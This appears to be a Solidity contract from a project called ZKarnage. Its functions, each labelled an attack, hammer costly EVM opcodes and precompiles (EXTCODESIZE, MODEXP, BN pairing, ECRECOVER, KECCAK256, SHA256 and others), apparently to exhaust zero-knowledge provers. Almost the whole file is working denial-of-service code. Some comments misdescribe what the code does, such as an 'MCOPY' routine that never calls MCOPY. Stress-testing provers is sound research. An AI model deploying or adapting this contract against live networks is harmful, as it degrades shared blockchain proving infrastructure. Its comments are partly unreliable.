// Source: https://github.com/yourbuddyconner/zkarnage/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract ZKarnage {
    event ContractAccessed(address indexed target, uint256 size);
    event AttackSummary(uint256 numContracts, uint256 totalSize);
    event ModExpResult(uint256 gasUsed, uint256 result);
    event PrecompileResult(string name, uint256 gasUsed);
    event OpcodeResult(string name, uint256 gasUsed);

    // Storage variables to ensure hash results are used and persisted
    bytes32 public accumulatedHash;
    bytes32 public accumulatedSha256Hash;

    // Precompile addresses
    address constant ECRECOVER_PRECOMPILE = 0x0000000000000000000000000000000000000001;
    address constant SHA256_PRECOMPILE = 0x0000000000000000000000000000000000000002;
    address constant IDENTITY_PRECOMPILE = 0x0000000000000000000000000000000000000004;
    address constant MODEXP_PRECOMPILE = 0x0000000000000000000000000000000000000005;
    address constant BN_ADD_PRECOMPILE = 0x0000000000000000000000000000000000000006;
    address constant BN_MUL_PRECOMPILE = 0x0000000000000000000000000000000000000007;
    address constant BN_PAIRING_PRECOMPILE = 0x0000000000000000000000000000000000000008;

    // Original EXTCODESIZE attack
    function executeAttack(address[] calldata targets) external {
        uint256 totalSize = 0;

        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 size;

            assembly {
                size := extcodesize(target)
            }

            totalSize += size;
            emit ContractAccessed(target, size);
        }

        emit AttackSummary(targets.length, totalSize);
    }

    // JUMPDEST attack - Most expensive opcode (1037.68 cycles/gas)
    function executeJumpdestAttack(uint256 iterations) external {
        uint256 gasStart = gasleft();
        uint256 result;

        assembly {
            for { let i := 0 } lt(i, iterations) { i := add(i, 1) } {
                // Force jumps through labeled blocks
                let x := 1
                switch x
                case 1 { result := 1 }
                case 2 { result := 2 }
                case 3 { result := 3 }
                case 4 { result := 4 }
                case 5 { result := 5 }
            }
        }

        emit OpcodeResult("JUMPDEST", gasStart - gasleft());
    }

    // MCOPY attack - Second most expensive opcode (666.39 cycles/gas)
    function executeMcopyAttack(uint256 size, uint256 iterations) external {
        uint256 gasStart = gasleft();
        bytes memory data = new bytes(size);

        assembly {
            for { let i := 0 } lt(i, iterations) { i := add(i, 1) } {
                // Perform memory operations using mstore/mload
                let value := mload(add(data, 64))
                mstore(add(data, 32), value)
                value := mload(add(data, 96))
                mstore(add(data, 64), value)
                value := mload(add(data, 128))
                mstore(add(data, 96), value)
            }
        }

        emit OpcodeResult("MCOPY", gasStart - gasleft());
    }

    // CALLDATACOPY attack - Third most expensive opcode (580.81 cycles/gas)
    function executeCalldatacopyAttack(uint256 size, uint256 iterations) external {
        uint256 gasStart = gasleft();
        bytes memory output = new bytes(size);

        assembly {
            for { let i := 0 } lt(i, iterations) { i := add(i, 1) } {
                calldatacopy(add(output, 32), 0, size)
            }
        }

        emit OpcodeResult("CALLDATACOPY", gasStart - gasleft());
    }

    // MODEXP attack targeting worst case from EIP-7883
    function executeModExpAttack(uint256 iterations) external {
        bytes memory base = new bytes(32);    // 32 bytes
        bytes memory exponent = new bytes(64); // 64 bytes to trigger higher cost
        bytes memory modulus = new bytes(32);  // 32 bytes

        // Fill with non-zero values to maximize complexity
        for(uint i = 0; i < base.length; i++) base[i] = 0xFF;
        for(uint i = 0; i < exponent.length; i++) exponent[i] = 0xFF;
        for(uint i = 0; i < modulus.length; i++) modulus[i] = 0xFF;

        uint256 inputSize = 32 + base.length + exponent.length + modulus.length;
        bytes memory input = new bytes(inputSize);

        assembly {
            mstore(add(input, 32), 32)  // base length
            mstore(add(input, 64), 64)  // exponent length
            mstore(add(input, 96), 32)  // modulus length
            mstore(add(input, 128), mload(add(base, 32)))
            mstore(add(input, 160), mload(add(exponent, 32)))
            mstore(add(input, 192), mload(add(exponent, 64)))
            mstore(add(input, 224), mload(add(modulus, 32)))
        }

        uint256 gasStart = gasleft();
        bool success;

        for(uint i = 0; i < iterations; i++) {
            // Use a large gas stipend, but it shouldn't consume nearly this much per call
            assembly {
                success := call(500000, MODEXP_PRECOMPILE, 0, add(input, 32), inputSize, 0, 32)
            }
            // Revert if any single call fails
            require(success, "MODEXP call failed");
        }

        uint256 gasUsed = gasStart - gasleft();
        emit PrecompileResult("MODEXP", gasUsed);
    }

    // BN_PAIRING attack - Most expensive precompile (37.91 cycles/gas)
    function executeBnPairingAttack(uint256 iterations) external {
        // Input for a single pairing check (2 points = 192 bytes)
        bytes memory input = new bytes(192);

        // Fill with valid pairing points that require max computation
        // Using 0xFF might not be valid points, but stresses the precompile
        for(uint i = 0; i < input.length; i++) {
            input[i] = 0xFF;
        }

        uint256 gasStart = gasleft();
        bool success;

        for(uint i = 0; i < iterations; i++) {
            // Use a large gas stipend
            assembly {
                success := call(500000, BN_PAIRING_PRECOMPILE, 0, add(input, 32), 192, 0, 32)
            }
            // require(success, "BN_PAIRING call failed"); // Allow test to proceed even if call fails
        }

        uint256 gasUsed = gasStart - gasleft();
        emit PrecompileResult("BN_PAIRING", gasUsed);
    }

    // BN_MUL attack - (17.48 cycles/gas)
    function executeBnMulAttack(uint256 iterations) external {
        // Input for point multiplication (128 bytes)
        bytes memory input = new bytes(128);

        // Fill with values to stress the precompile
        for(uint i = 0; i < input.length; i++) {
            input[i] = 0xFF;
        }

        uint256 gasStart = gasleft();
        bool success;

        for(uint i = 0; i < iterations; i++) {
             // Use a large gas stipend
            assembly {
                // BN_MUL output is 64 bytes
                success := call(500000, BN_MUL_PRECOMPILE, 0, add(input, 32), 128, 0, 64)
            }
            // require(success, "BN_MUL call failed"); // Allow test to proceed even if call fails
        }

        uint256 gasUsed = gasStart - gasleft();
        emit PrecompileResult("BN_MUL", gasUsed);
    }

    // ECRECOVER attack - (15.74 cycles/gas)
    function executeEcrecoverAttack(uint256 iterations) external {
        // Prepare inputs for ecrecover (128 bytes total)
        bytes32 hash = keccak256(abi.encodePacked(uint256(0))); // Example hash
        uint8 v = 27; // Valid v value (must be 27 or 28)
        bytes32 r = bytes32(uint256(1)); // Example r
        bytes32 s = bytes32(uint256(2)); // Example s

        // Pre-allocate memory for input to avoid allocation inside loop
        bytes memory input = new bytes(128);
        assembly {
             mstore(add(input, 0x20), hash)
             mstore(add(input, 0x40), v)
             mstore(add(input, 0x60), r)
             mstore(add(input, 0x80), s)
        }

        uint256 gasStart = gasleft();
        bool success;
        address recoveredAddr; // To store result, preventing removal by optimizer

        for(uint i = 0; i < iterations; i++) {
             // Update hash slightly per iteration to ensure work is done
             assembly {
                mstore(add(input, 0x20), keccak256(add(input, 0x20), 32))
             }

             // Use a large gas stipend
             assembly {
                 // ECRECOVER input starts at offset 32 (skip length), length 128
                 // Output is address (32 bytes, right-padded with zeros)
                success := call(50000, ECRECOVER_PRECOMPILE, 0, add(input, 32), 128, 0, 32)
                recoveredAddr := mload(0) // Load result into memory
             }
             require(success, "ECRECOVER call failed");
        }
        // Ensure recoveredAddr is used somehow (though event is primary output)
        if (recoveredAddr == address(0)) { }

        uint256 gasUsed = gasStart - gasleft();
        emit PrecompileResult("ECRECOVER", gasUsed);
    }

    // KECCAK256 attack
    function executeKeccakAttack(uint256 iterations, uint256 dataSize) external {
        require(dataSize >= 32, "Data size must be at least 32 bytes");
        require(dataSize <= 4096, "Data size must not exceed 4096 bytes");

        uint256 gasStart = gasleft();

        // Pure Yul implementation to defeat optimizer
        assembly {
            // Use smaller memory buffers for large iteration counts
            let actualDataSize := dataSize

            // For large iteration counts, limit data size to reduce memory pressure
            if gt(iterations, 50000) {
                actualDataSize := 512
            }

            // Allocate memory for our data buffer
            let memPtr := mload(0x40)  // Get free memory pointer
            let dataPtr := add(memPtr, 32)  // Skip first 32 bytes for length

            // Update free memory pointer
            mstore(0x40, add(dataPtr, actualDataSize))

            // Initialize memory with non-zero data (only init the first 512 bytes to save gas)
            let i := 0
            for { } lt(i, 512) { i := add(i, 32) } {
                mstore(add(dataPtr, i), xor(i, timestamp()))
            }

            // Get block values for unpredictability
            let blockNum := number()
            let timeVal := timestamp()

            // Use accumulatedHash as starting point
            let runningHash := sload(accumulatedHash.slot)

            // Break into smaller batches of 5000 iterations to prevent stack/memory issues
            let batchSize := 5000
            let remainingIters := iterations

            // Batch processing loop
            for { } gt(remainingIters, 0) { } {
                // Calculate current batch
                let currentBatch := remainingIters
                if gt(currentBatch, batchSize) {
                    currentBatch := batchSize
                }

                // Store the current batch number in memory to influence calculations
                mstore(add(dataPtr, 64), remainingIters)

                // Inner loop for this batch
                for { i := 0 } lt(i, currentBatch) { i := add(i, 1) } {
                    // Change input based on counter & previous hash
                    mstore(dataPtr, xor(runningHash, xor(i, blockNum)))
                    mstore(add(dataPtr, 32), xor(i, timeVal))

                    // Do the keccak operation and save result
                    runningHash := keccak256(dataPtr, actualDataSize)

                    // Store back to influence next iteration
                    mstore(dataPtr, runningHash)

                    // Every 500 iterations, update storage to prevent optimization
                    if eq(mod(i, 500), 499) {
                        sstore(accumulatedHash.slot, runningHash)
                    }
                }

                // Update remaining iterations
                remainingIters := sub(remainingIters, currentBatch)

                // Store intermediate result to storage after each batch
                sstore(accumulatedHash.slot, runningHash)
            }

            // Final storage of result
            sstore(accumulatedHash.slot, runningHash)

            // Log the final hash as a useful side effect
            log1(0, 0, runningHash)
        }

        uint256 gasUsed = gasStart - gasleft();
        emit OpcodeResult("KECCAK256", gasUsed);
    }

    // SHA256 attack
    function executeSha256Attack(uint256 iterations, uint256 dataSize) external {
        require(dataSize >= 32, "Data size must be at least 32 bytes");
        require(dataSize <= 4096, "Data size must not exceed 4096 bytes");

        uint256 gasStart = gasleft();

        // Pure Yul implementation to defeat optimizer
        assembly {
            // Use smaller memory buffers for large data and iterations
            let actualDataSize := dataSize

            // For large data sizes, limit size to reduce memory pressure
            if and(gt(iterations, 10000), gt(dataSize, 512)) {
                actualDataSize := 512
            }

            // Allocate memory for data and result
            let memPtr := mload(0x40)  // Get free memory pointer
            let dataPtr := add(memPtr, 32)  // Skip first 32 bytes for length
            let resultPtr := add(dataPtr, actualDataSize)  // Space for result after data

            // Update free memory pointer
            mstore(0x40, add(resultPtr, 32))  // 32 bytes for result

            // Initialize memory with non-zero data (only init the first 512 bytes to save gas)
            let i := 0
            for { } lt(i, 512) { i := add(i, 32) } {
                mstore(add(dataPtr, i), xor(i, timestamp()))
            }

            // Get block values for unpredictability
            let blockNum := number()
            let timeVal := timestamp()

            // Use accumulatedSha256Hash as starting point
            let runningHash := sload(accumulatedSha256Hash.slot)
            mstore(dataPtr, runningHash)

            // Track success status
            let success := 1

            // Adjust batch size based on data size to prevent out-of-gas errors
            let batchSize := 5000
            if gt(actualDataSize, 1024) {
                batchSize := 2000  // Smaller batches for larger data
            }
            if gt(actualDataSize, 2048) {
                batchSize := 1000  // Even smaller batches for 2048+ byte data
            }

            // Break into smaller batches to prevent stack/memory issues
            let remainingIters := iterations

            // Batch processing loop
            for { } gt(remainingIters, 0) { } {
                // Calculate current batch
                let currentBatch := remainingIters
                if gt(currentBatch, batchSize) {
                    currentBatch := batchSize
                }

                // Store the current batch number in memory to influence calculations
                mstore(add(dataPtr, 64), remainingIters)

                // Inner loop for this batch
                for { i := 0 } lt(i, currentBatch) { i := add(i, 1) } {
                    // Change input based on counter & previous hash to ensure uniqueness
                    mstore(dataPtr, xor(runningHash, xor(i, blockNum)))
                    mstore(add(dataPtr, 32), xor(i, timeVal))

                    // Call SHA256 precompile
                    success := staticcall(gas(), SHA256_PRECOMPILE, dataPtr, actualDataSize, resultPtr, 32)

                    // Check success and revert if needed
                    if iszero(success) {
                        mstore(0, 0x08c379a000000000000000000000000000000000000000000000000000000000) // Error signature
                        mstore(4, 32)  // String offset
                        mstore(36, 27) // String length
                        mstore(68, "SHA256 precompile call failed") // Error message
                        revert(0, 100)
                    }

                    // Get result and use for next iteration
                    runningHash := mload(resultPtr)

                    // Store back to influence next iteration
                    mstore(dataPtr, runningHash)

                    // Every 200 iterations, update storage to prevent optimization
                    // Do this more frequently with large data
                    if eq(mod(i, 200), 199) {
                        sstore(accumulatedSha256Hash.slot, runningHash)
                    }
                }

                // Update remaining iterations
                remainingIters := sub(remainingIters, currentBatch)

                // Store intermediate result to storage after each batch
                sstore(accumulatedSha256Hash.slot, runningHash)
            }

            // Final storage of result
            sstore(accumulatedSha256Hash.slot, runningHash)

            // Log the final hash as a useful side effect
            log1(0, 0, runningHash)
        }

        uint256 gasUsed = gasStart - gasleft();
        emit PrecompileResult("SHA256", gasUsed);
    }
}
